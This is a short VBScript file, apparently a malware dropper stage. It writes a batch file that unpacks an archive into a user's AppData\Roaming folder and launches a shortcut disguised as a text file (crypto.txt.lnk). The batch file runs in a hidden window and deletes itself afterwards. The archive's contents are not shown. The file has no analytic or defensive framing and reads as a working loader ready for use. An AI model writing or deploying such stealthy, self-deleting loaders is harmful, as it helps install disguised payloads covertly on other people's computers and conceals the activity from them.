Dim objFSO, outFile

Set objFSO = CreateObject("Scripting.FileSystemObject")

Set outFile = objFSO.CreateTextFile("script.bat", True)

outFile.WriteLine "tar -xf Configuration.tar -C C:\Users\puza7\AppData\Roaming"
'Replace with name of file
outFile.WriteLine "C:\Users\puza7\AppData\Roaming\Configuration\crypto.txt.lnk"
'outFile.WriteLine "timeout 5 > NUL"
outFile.WriteLine "Del script.bat"

outFile.Close

Set shell = WScript.CreateObject("WScript.Shell")
shell.Run """" & "script.bat", 0 , False
